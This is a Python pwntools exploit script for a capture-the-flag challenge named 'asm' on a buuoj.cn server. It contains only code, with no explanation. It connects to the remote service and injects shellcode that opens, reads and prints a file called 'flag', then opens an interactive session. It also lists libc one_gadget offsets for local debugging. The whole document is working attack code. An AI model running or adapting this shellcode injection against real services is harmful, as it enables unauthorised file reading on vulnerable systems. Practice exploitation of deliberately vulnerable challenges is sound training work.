#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/15 10:13:22
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    if context.arch == amd64:
        sh = process(['./asm'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
#		sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        sh = process(['./asm'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
#		sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 27821
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('asm')
shellcode = shellcraft.pushstr('flag')
shellcode += shellcraft.open('rsp')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
payload = asm(shellcode)
sh.sendline(payload)
sh.interactive()